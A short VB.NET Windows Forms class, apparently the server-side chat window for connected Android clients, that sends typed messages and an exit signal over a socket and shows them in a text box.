Public Class Android_chat
    '##################################################
    '################### CODED  #######################
    '##################### BY #########################
    '############### Saher Blue Eagle  ################
    '###############  XPR OPEN SOURCE  ################
    '##################################################
    '##################################################
    Public sock As Integer
    Private Sub TextBox1_KeyDown(sender As System.Object, e As System.Windows.Forms.KeyEventArgs) Handles TextBox1.KeyDown
        If e.KeyCode = Keys.Enter Then

            Form1.Server.Send_DX(sock, "chat_set" & SplitData & Me.TextBox1.Text)
            RichTextBox1.AppendText("You : " & Me.TextBox1.Text & vbNewLine)
            Me.TextBox1.Text = ""
        End If
    End Sub

    Private Sub Android_chat_FormClosing(sender As System.Object, e As System.Windows.Forms.FormClosingEventArgs) Handles MyBase.FormClosing


        Form1.Server.Send_DX(sock, "chat_set" & SplitData & "/exit/chat/")

    End Sub


End Class